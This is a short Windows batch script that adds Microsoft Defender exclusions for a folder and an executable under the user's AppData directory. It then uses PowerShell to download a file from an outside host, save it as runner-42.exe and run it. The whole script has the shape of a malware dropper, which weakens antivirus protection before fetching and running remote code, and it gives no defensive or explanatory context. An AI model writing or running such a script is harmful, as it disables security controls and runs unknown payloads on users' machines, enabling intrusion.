@echo off
cmd /c powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Product'
cmd /c powershell -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\AppData\Product\tool.exe'
@echo off
powershell Invoke-WebRequest https://download.invalid/setup -OutFile runner-42.exe
cmd /c runner-42.exe
